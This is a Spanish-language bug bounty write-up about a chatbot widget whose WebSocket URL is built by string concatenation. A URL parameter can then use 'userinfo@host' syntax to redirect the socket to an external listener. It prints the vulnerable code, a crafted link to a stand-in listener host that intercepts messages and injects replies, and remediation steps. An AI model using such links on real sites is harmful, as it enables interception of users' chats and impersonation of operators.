WebSocket injection_

CWE-15Medium
Web SecurityWebSocketURL ParsingChatbot Security

Encontré este comportamiento durante pruebas autorizadas en un programa de bug bounty. El frontend de un chatbot permitía reemplazar parte de la dirección utilizada para abrir su conexión WebSocket mediante un parámetro de la URL.

El valor llegaba hasta la configuración del transporte sin una allowlist de hosts. Como la URL final se construía mediante concatenación de strings, era posible utilizar la sintaxis userinfo@host para hacer que el navegador se conectara a un servidor diferente del que aparentaba la cadena.

El programa no se identifica. Los parámetros, dominios, estructuras y ejemplos de esta página son sintéticos.

El override

El widget aceptaba una opción de configuración equivalente a esta:

{
  "overrides": {
    "transport_url_parameter": "transport"
  }
}

Durante la carga, el valor del parámetro reemplazaba directamente el path configurado para el canal:

const override = query.get("transport");

if (override) {
  channel.path = override;
}

El transporte construía después la URL efectiva concatenando el esquema, el host esperado y ese valor:

const socketUrl = "wss://" + trustedHost + channel.path;
const socket = new WebSocket(socketUrl);

El código asumía que channel.path siempre comenzaría con /. No lo comprobaba.

El problema con @

En una URL, el texto situado antes de @ puede interpretarse como información de usuario. Por ejemplo:

wss://trusted-chat.example.test@listener.example.test/socket

A simple vista, la cadena comienza con el dominio esperado. Para el parser del navegador, sin embargo, el hostname real es:

listener.example.test

Si el valor controlado comienza con @listener.example.test/socket, la concatenación produce exactamente esa estructura.

El flujo era:

parámetro controlado desde la URL
        ↓
override del path del canal
        ↓
concatenación con "wss://" y el host esperado
        ↓
interpretación de userinfo@host
        ↓
conexión WebSocket hacia el listener externo

Reproducción en un entorno controlado

La estructura del enlace se normalizó para este caso:

https://portal.example.test/support/?transport=@listener.example.test/socket

Al abrirlo, el widget construía una URL equivalente a:

wss://portal.example.test@listener.example.test/socket?conversation=<random-id>

El servidor externo recibía el handshake con el origen de la aplicación legítima. Después de aceptar la conexión, podía observar los mensajes escritos en el widget.

Para comprobar el flujo inverso, el listener respondió con una estructura genérica admitida por el cliente:

{
  "type": "message",
  "data": {
    "text": "Controlled response"
  }
}

La respuesta se renderizaba dentro del widget. Esto confirmó dos efectos independientes:

  1. Los mensajes enviados por el usuario llegaban al servidor externo.
  2. El servidor externo podía controlar las respuestas mostradas dentro de la interfaz legítima.

Impacto

Una persona podía preparar un enlace que mantuviera la interfaz y el origen visual del sitio legítimo mientras desviaba el canal de comunicación hacia infraestructura externa.

Si un usuario utilizaba el chat desde ese enlace, sus mensajes podían ser interceptados en tiempo real. Al mismo tiempo, las respuestas del servidor externo aparecían dentro del widget, haciendo posible suplantar al operador o bot esperado.

El impacto no dependía de comprometer el servidor original. La confianza provenía de la página legítima, mientras que el transporte había sido reemplazado desde el navegador de la víctima.

Causa raíz

La vulnerabilidad combinaba tres errores:

  1. Una opción interna de override estaba expuesta mediante la URL pública.
  2. El valor se utilizaba sin validar que fuera únicamente un path relativo.
  3. La dirección WebSocket se construía con concatenación de strings en lugar de utilizar un parser de URLs y comprobar el hostname resultante.

Remediación

La opción de override no debería estar disponible en producción. Si existe una necesidad legítima, el valor debe limitarse estrictamente a paths relativos:

^/[a-zA-Z0-9/_-]+$

La URL debe construirse con la API URL y validarse después del parsing:

const target = new URL(relativePath, "wss://chat.example.test");

if (target.hostname !== "chat.example.test") {
  throw new Error("Unexpected WebSocket host");
}

También conviene rechazar credenciales en la URL, esquemas alternativos, protocol-relative URLs y cualquier valor que cambie el origen esperado.

Estado del reporte

El comportamiento fue reportado al programa y permanece sin resolver.
